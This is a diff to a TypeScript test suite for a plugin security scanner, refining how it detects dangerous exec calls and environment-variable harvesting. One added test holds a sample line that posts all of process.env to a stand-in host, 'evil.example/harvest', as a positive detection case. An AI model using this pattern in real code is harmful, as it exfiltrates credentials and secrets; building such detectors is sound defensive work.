@@ -35,13 +35,13 @@ function expectScanRule(
 ) {
   const findings = scanSource(source, "plugin.ts");
   expect(
-    findings.some(
+    findings.filter(
       (finding) =>
         finding.ruleId === expected.ruleId &&
         (expected.severity == null || finding.severity === expected.severity) &&
         (expected.messageIncludes == null || finding.message.includes(expected.messageIncludes)),
     ),
-  ).toBe(true);
+  ).not.toEqual([]);
 }
 
 function writeFixtureFiles(root: string, files: Record<string, string | undefined>) {
@@ -69,7 +69,12 @@ function mockStatPermissionDeniedFor(filePath: string) {
 }
 
 function expectRulePresence(findings: { ruleId: string }[], ruleId: string, expected: boolean) {
-  expect(findings.some((finding) => finding.ruleId === ruleId)).toBe(expected);
+  const ruleIds = findings.map((finding) => finding.ruleId);
+  if (expected) {
+    expect(ruleIds).toContain(ruleId);
+  } else {
+    expect(ruleIds).not.toContain(ruleId);
+  }
 }
 
 async function runNamedCase(name: string, run: () => void | Promise<void>) {
@@ -252,7 +257,7 @@ import type { ExecOptions } from "child_process";
 const options: ExecOptions = { timeout: 5000 };
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
+    expectRulePresence(findings, "dangerous-exec", false);
   });
 
   it("does not flag RegExp.exec when child_process appears elsewhere", () => {
@@ -262,7 +267,7 @@ const options: ExecOptions = {};
 const match = /^keychain:(.+)$/.exec(value);
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
+    expectRulePresence(findings, "dangerous-exec", false);
   });
 
   it("does not use full-line comments as source-rule context", () => {
@@ -271,7 +276,19 @@ const env = process.env;
 // fetch() can reach the endpoint later.
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("does not use inline or block comments as source-rule context", () => {
+    const source = `
+const env = process.env; // fetch("https://example.invalid")
+/*
+ * rest.post("/channels/123/messages", {});
+ */
+const url = "https://example.com/path//segment";
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", false);
   });
 
   it("returns empty array for clean plugin code", () => {
@@ -281,7 +298,7 @@ export function greet(name: string): string {
 }
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings).toEqual([]);
+    expect(findings).toStrictEqual([]);
   });
 
   it("returns empty array for normal http client code (just a fetch GET)", () => {
@@ -291,7 +308,7 @@ const json = await response.json();
 console.log(json);
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings).toEqual([]);
+    expect(findings).toStrictEqual([]);
   });
 
   it("does not treat fetch in names or comments as network send context", () => {
@@ -302,7 +319,32 @@ async function closeFetchHandles() {
 }
 `;
     const findings = scanSource(source, "plugin.ts");
-    expect(findings.some((f) => f.ruleId === "env-harvesting")).toBe(false);
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("does not flag ordinary env defaults when network sends are elsewhere in a bundled file", () => {
+    const source = `
+function resolvePreferencesStorePath(env = process.env) {
+  return path.join(resolveStateDir(env), "discord", "model-picker-preferences.json");
+}
+
+${"\n".repeat(20)}
+
+export async function sendMessage(rest, channelId, data) {
+  return await rest.post(\`/channels/\${channelId}/messages\`, data);
+}
+`;
+    const findings = scanSource(source, "provider-bundle.js");
+    expectRulePresence(findings, "env-harvesting", false);
+  });
+
+  it("still flags local process.env sends", () => {
+    const source = `
+const env = process.env;
+await fetch("https://evil.example/harvest", { method: "POST", body: JSON.stringify(env) });
+`;
+    const findings = scanSource(source, "plugin.ts");
+    expectRulePresence(findings, "env-harvesting", true);
   });
 });
 
